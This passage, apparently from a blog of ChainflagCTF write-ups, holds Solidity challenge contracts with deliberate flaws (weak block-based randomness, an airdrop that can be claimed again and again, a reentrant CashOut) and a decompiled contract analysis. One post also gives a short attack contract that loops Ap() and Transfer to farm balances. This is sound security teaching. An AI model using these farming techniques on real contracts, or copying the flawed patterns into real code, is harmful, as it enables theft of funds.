hold</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).</span><br><span class="line">  */</span><br><span class="line">  function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b &lt;= a);</span><br><span class="line">    uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Adds two numbers, reverts on overflow.</span><br><span class="line">  */</span><br><span class="line">  function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a);</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),</span><br><span class="line">  * reverts when dividing by zero.</span><br><span class="line">  */</span><br><span class="line">  function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b != 0);</span><br><span class="line">    return a % b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract WinnerList&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    struct Richman&#123;</span><br><span class="line">        address who;</span><br><span class="line">        uint balance;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function note(address _addr, uint _value) public&#123;</span><br><span class="line">        Richman rm;</span><br><span class="line">        rm.who = _addr;</span><br><span class="line">        rm.balance = _value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Fake3D &#123;</span><br><span class="line">    using SafeMath for *;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint256)  public balance;</span><br><span class="line">    uint public totalSupply  = 10**18;</span><br><span class="line">    WinnerList wlist;</span><br><span class="line"> </span><br><span class="line">    event FLAG(string b64email, string slogan);</span><br><span class="line"> </span><br><span class="line">    constructor(address _addr) public&#123;</span><br><span class="line">        wlist = WinnerList(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier turingTest() &#123;</span><br><span class="line">        address _addr = msg.sender;</span><br><span class="line">        uint256 _codeLength;</span><br><span class="line">        assembly &#123;_codeLength := extcodesize(_addr)&#125;</span><br><span class="line">        require(_codeLength == 0, &quot;sorry humans only&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transfer(address _to, uint256 _amount) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= _amount);</span><br><span class="line">        balance[msg.sender] = balance[msg.sender].sub(_amount);</span><br><span class="line">        balance[_to] = balance[_to].add(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function airDrop() public turingTest returns (bool) &#123;</span><br><span class="line">        uint256 seed = uint256(keccak256(abi.encodePacked(</span><br><span class="line">        (block.timestamp).add</span><br><span class="line">        (block.difficulty).add</span><br><span class="line">        ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add</span><br><span class="line">        (block.gaslimit).add</span><br><span class="line">        ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add</span><br><span class="line">        (block.number))));</span><br><span class="line"></span><br><span class="line">        if((seed - ((seed / 1000) * 1000)) &lt; 288)&#123;</span><br><span class="line">            balance[tx.origin] = balance[tx.origin].add(10);</span><br><span class="line">            totalSupply = totalSupply.sub(10);</span><br><span class="line">            return true;   </span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function CaptureTheFlag(string b64email) public&#123;</span><br><span class="line">        require (balance[msg.sender] &gt; 8888);</span><br><span class="line">        wlist.note(msg.sender,balance[msg.sender]);</span><br><span class="line">        emit FLAG(b64email, &quot;Congratulations to capture the flag?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>This level is about airdrop, and it is funny, let’s look at the airdrop() function: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function airDrop() public turingTest returns (bool) &#123;</span><br><span class="line">    uint256 seed = uint256(keccak256(abi.encodePacked(</span><br><span class="line">    (block.timestamp).add</span><br><span class="line">    (block.difficulty).add</span><br><span class="line">    ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add</span><br><span class="line">    (block.gaslimit).add</span><br><span class="line">    ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add</span><br><span class="line">    (block.number))));</span><br><span class="line"></span><br><span class="line">    if((seed - ((seed / 1000) * 1000)) &lt; 288)&#123;</span><br><span class="line">        balance[tx.origin] = balance[tx.origin].add(10);</span><br><span class="line">        totalSupply = totalSupply.sub(10);</span><br><span class="line">        return true;   </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>seed - ((seed / 1000) * 1000)) &lt; 288</code>：The obtained seed needs to meet certain conditions: less than 288, which means a probability of success of 288/1000.</p><p>Because the information that determines the seed is in the block, the caller cannot control it (miners can choose), so we can only try it randomly until we get 8888 money(only get 10 if we guess successfully:( so it will take many times to get 8888 money). Fortunately, this method only consumes GAS instead of ETH.</p><p>And then let’s look at the turingTest(), it means we can use an EOA account to call airdrop() or a contract that only has a constructor() but no function(). So in this level, we can use EOA account to do or create a contract to do. You can create a specific account in the <a href="https://vanity-eth.tk/">site</a>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">modifier turingTest() &#123;</span><br><span class="line">    address _addr = msg.sender;</span><br><span class="line">    uint256 _codeLength;</span><br><span class="line">    assembly &#123;_codeLength := extcodesize(_addr)&#125;</span><br><span class="line">    require(_codeLength == 0, &quot;sorry humans only&quot;);</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>But when we are resolving it, something wrong happened…. And this is the funny part, let’s look at the note() function:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function note(address _addr, uint _value) public&#123;</span><br><span class="line">    Richman rm;</span><br><span class="line">    rm.who = _addr;</span><br><span class="line">    rm.balance = _value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It is so normal, right? but why our tx fail? Because the puzzle provider us a wrong contract! The WinnerList contract is a fake contract! I search the WinnerList tx in the blockchain browser, found the address of WinnerList and decompile it, the output is as following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    function main() &#123;</span><br><span class="line">        memory[0x40:0x60] = 0x80;</span><br><span class="line">    </span><br><span class="line">        if (msg.data.length &lt; 0x04) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        var var0 = msg.data[0x00:0x20] / 0x0100000000000000000000000000000000000000000000000000000000 &amp; 0xffffffff;</span><br><span class="line">    </span><br><span class="line">        if (var0 != 0x03b6eb88) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        var var1 = msg.value;</span><br><span class="line">    </span><br><span class="line">        if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        var1 = 0x0091;</span><br><span class="line">        var var2 = msg.data[0x04:0x24] &amp; 0xffffffffffffffffffffffffffffffffffffffff;</span><br><span class="line">        var var3 = msg.data[0x24:0x44];</span><br><span class="line">        func_0093(var2, var3);</span><br><span class="line">        stop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function func_0093(var arg0, var arg1) &#123;</span><br><span class="line">        var var0 = 0x00;</span><br><span class="line">        storage[var0] = (arg0 &amp; 0xffffffffffffffffffffffffffffffffffffffff) | (storage[var0] &amp; ~0xffffffffffffffffffffffffffffffffffffffff);</span><br><span class="line">        storage[var0 + 0x01] = arg1;</span><br><span class="line">        var var1 = ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &amp; 0x0100000000000000000000000000000000000000000000000000000000000000 * 0xb1;</span><br><span class="line">        var var2 = tx.origin * 0x01000000000000000000000000;</span><br><span class="line">        var var3 = 0x12;</span><br><span class="line">    </span><br><span class="line">        if (var3 &gt;= 0x14) &#123; assert(); &#125;</span><br><span class="line">    </span><br><span class="line">        var temp0 = byte(var2, var3) * 0x0100000000000000000000000000000000000000000000000000000000000000 &amp; ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff != var1;</span><br><span class="line">        var1 = temp0;</span><br><span class="line">    </span><br><span class="line">        if (!var1) &#123;</span><br><span class="line">        label_023F:</span><br><span class="line">        </span><br><span class="line">            if (!var1) &#123; return; &#125;</span><br><span class="line">            else &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var1 = ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &amp; 0x0100000000000000000000000000000000000000000000000000000000000000 * 0x43;</span><br><span class="line">            var2 = tx.origin * 0x01000000000000000000000000;</span><br><span class="line">            var3 = 0x13;</span><br><span class="line">        </span><br><span class="line">            if (var3 &gt;= 0x14) &#123; assert(); &#125;</span><br><span class="line">        </span><br><span class="line">            var1 = byte(var2, var3) * 0x0100000000000000000000000000000000000000000000000000000000000000 &amp; ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff != var1;</span><br><span class="line">            goto label_023F;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Obviously, the real contract has a lot of code that proves the contract given us is fake. But how to read it? I can’t understand the decompile contract :( Don’t worry, let’s analysis it step by step. </p><p>(1) We can easily infer the <code>func_0093()</code> function is <code>note()</code></p><p>(2) <code>address _addr</code> ===&gt; <code>var arg0</code>,    <code>uint _value</code>  ===&gt;  <code>var arg1</code></p><p>(3) </p><p><img src="https://moe.photo/images/2023/05/21/_20230521191426.png" alt="https://moe.photo/images/2023/05/21/_20230521191426.png"></p><p>(4) byte(x,y): nth byte of x, where the most significant byte is the 0th byte. In this case, the penultimate byte of tx.origin is 0xb1.</p><p>(5) if the penultimate byte is not 0xb1, 0x43 in the last byte can be ok.</p><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p>All in all, we can solve this level like this:</p><ol><li>get a specific account that pass the function <code>note()</code>, you have 2 choice:<ul><li>EOA account: get a specific EOA in this <a href="https://vanity-eth.tk/">site</a></li><li>create a contract with opcode <code>CREATE2</code>, while it only has a constructor.</li></ul></li><li>call <code>airDrop()</code> again and again until we get 8888 money</li></ol><p>All in all, the puzzle provider is tricky, he gave us a wrong ABI(WinnerList), and we can only decompile its bytecode and analyses diffucultly.</p>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.airdrop-hunting @CoinFlip</title>
      <link href="/2023/07/13/02.ChainflagCTF/03.airdrop-hunting%20@CoinFlip/"/>
      <url>/2023/07/13/02.ChainflagCTF/03.airdrop-hunting%20@CoinFlip/</url>
      
        <content type="html"><![CDATA[<h1 id="airdrop-hunting-CoinFlip"><a href="#airdrop-hunting-CoinFlip" class="headerlink" title="airdrop-hunting(CoinFlip)"></a>airdrop-hunting(CoinFlip)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract P_Bank&#123;</span><br><span class="line">    mapping (address =&gt; uint) public balances;</span><br><span class="line">    uint public MinDeposit = 0.1 ether;</span><br><span class="line">    Log TransferLog;</span><br><span class="line"></span><br><span class="line">    event FLAG(string b64email, string slogan);</span><br><span class="line"></span><br><span class="line">    constructor(address _log) public &#123;</span><br><span class="line">        TransferLog = Log(_log);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    function Ap() public &#123;</span><br><span class="line">        if(balances[msg.sender] == 0) &#123;</span><br><span class="line">            balances[msg.sender]+=1 ether;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Transfer(address to, uint val) public &#123;</span><br><span class="line">        if(val &gt; balances[msg.sender]) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        balances[to]+=val;</span><br><span class="line">        balances[msg.sender]-=val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function CaptureTheFlag(string b64email) public returns(bool)&#123;</span><br><span class="line">      require (balances[msg.sender] &gt; 500 ether);</span><br><span class="line">      emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function Deposit() public payable &#123;</span><br><span class="line">        if(msg.value &gt; MinDeposit) &#123;</span><br><span class="line">            balances[msg.sender]+= msg.value;</span><br><span class="line">            TransferLog.AddMessage(msg.sender,msg.value,&quot;Deposit&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function CashOut(uint _am) public&#123;</span><br><span class="line">        if(_am&lt;=balances[msg.sender])&#123;</span><br><span class="line">            if(msg.sender.call.value(_am)())&#123;</span><br><span class="line">                balances[msg.sender]-=_am;</span><br><span class="line">                TransferLog.AddMessage(msg.sender,_am,&quot;CashOut&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Log&#123;</span><br><span class="line"></span><br><span class="line">    struct Message&#123;</span><br><span class="line">        address Sender;</span><br><span class="line">        string  Data;</span><br><span class="line">        uint Val;</span><br><span class="line">        uint  Time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    string err = &quot;CashOut&quot;;</span><br><span class="line">    Message[] public History;</span><br><span class="line"></span><br><span class="line">    Message LastMsg;</span><br><span class="line"></span><br><span class="line">    function AddMessage(address _adr,uint _val,string _data) public &#123;</span><br><span class="line">        LastMsg.Sender = _adr;</span><br><span class="line">        LastMsg.Time = now;</span><br><span class="line">        LastMsg.Val = _val;</span><br><span class="line">        LastMsg.Data = _data;</span><br><span class="line">        History.push(LastMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>The person who does not have money in P_Bank can call <code>AP()</code> to get 1 ETH. But the contract doesn’t record who has called it! It means that I can call <code>AP()</code> and get money, transfer it to others, get money ,transfer…….it is convenience for a contract to do it .</p><p>By the way, even if the contract records the users who have called <code>AP()</code>, we can still create many accounts to operate. Creating accounts in Ethereum is an easy task. This is called “撸空投” in Chinese.</p><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;./03.CoinFlip.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CoinFlipAttackAttack &#123;</span><br><span class="line">    P_Bank c;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        c = P_Bank(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        for (uint i = 0; i &lt; 501; i++) &#123;</span><br><span class="line">            c.Ap();</span><br><span class="line">            c.Transfer(msg.sender, 1 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>console output</p><p><img src="https://moe.photo/images/2023/05/21/image-20230521144949607.png" alt="https://moe.photo/images/2023/05/21/image-20230521144949607.png"></p>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.bad-randomness @EOSGame</title>
      <link href="/2023/07/13/02.ChainflagCTF/02.bad-randomness%20@EOSGame/"/>
      <url>/2023/07/13/02.ChainflagCTF/02.bad-randomness%20@EOSGame/</url>
      
        <content type="html"><![CDATA[<h1 id="bad-randomness-EOSGame"><a href="#bad-randomness-EOSGame" class="headerlink" title="bad-randomness(EOSGame)"></a>bad-randomness(EOSGame)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *Submitted for verification at Etherscan.io on 2018-11-26</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SafeMath</span><br><span class="line"> * @dev Math operations with safety checks that revert on error</span><br><span class="line"> */</span><br><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Multiplies two numbers, reverts on overflow.</span><br><span class="line">  */</span><br><span class="line">  function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    // Gas optimization: this is cheaper than requiring &#x27;a&#x27; not being zero, but the</span><br><span class="line">    // benefit is lost if &#x27;b&#x27; is also tested.</span><br><span class="line">    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522</span><br><span class="line">    if (a == 0) &#123;</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    require(c / a == b);</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.</span><br><span class="line">  */</span><br><span class="line">  function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b &gt; 0); // Solidity only automatically asserts when dividing by 0</span><br><span class="line">    uint256 c = a / b;</span><br><span class="line">    // assert(a == b * c + a % b); // There is no case in which this doesn&#x27;t hold</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).</span><br><span class="line">  */</span><br><span class="line">  function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b &lt;= a);</span><br><span class="line">    uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Adds two numbers, reverts on overflow.</span><br><span class="line">  */</span><br><span class="line">  function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a);</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),</span><br><span class="line">  * reverts when dividing by zero.</span><br><span class="line">  */</span><br><span class="line">  function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b != 0);</span><br><span class="line">    return a % b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract EOSToken&#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    string TokenName = &quot;EOS&quot;;</span><br><span class="line"></span><br><span class="line">    uint256 totalSupply = 100**18;</span><br><span class="line">    address owner;</span><br><span class="line">    mapping(address =&gt; uint256)  balances;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        balances[owner] = totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address _to,uint256 _amount) public onlyOwner &#123;</span><br><span class="line">        require(_amount &lt; totalSupply);</span><br><span class="line">        totalSupply = totalSupply.sub(_amount);</span><br><span class="line">        balances[_to] = balances[_to].add(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _from, address _to, uint256 _amount) public onlyOwner &#123;</span><br><span class="line">        require(_amount &lt; balances[_from]);</span><br><span class="line">        balances[_from] = balances[_from].sub(_amount);</span><br><span class="line">        balances[_to] = balances[_to].add(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function eosOf(address _who) public constant returns(uint256)&#123;</span><br><span class="line">        return balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract EOSGame&#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    mapping(address =&gt; uint256) public bet_count;</span><br><span class="line">    uint256 FUND = 100;</span><br><span class="line">    uint256 MOD_NUM = 20;</span><br><span class="line">    uint256 POWER = 100;</span><br><span class="line">    uint256 SMALL_CHIP = 1;</span><br><span class="line">    uint256 BIG_CHIP = 20;</span><br><span class="line">    EOSToken  eos;</span><br><span class="line"></span><br><span class="line">    event FLAG(string b64email, string slogan);</span><br><span class="line"></span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        eos=new EOSToken();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initFund() public&#123;</span><br><span class="line">        if(bet_count[tx.origin] == 0)&#123;</span><br><span class="line">            bet_count[tx.origin] = 1;</span><br><span class="line">            eos.mint(tx.origin, FUND);</span><br><span 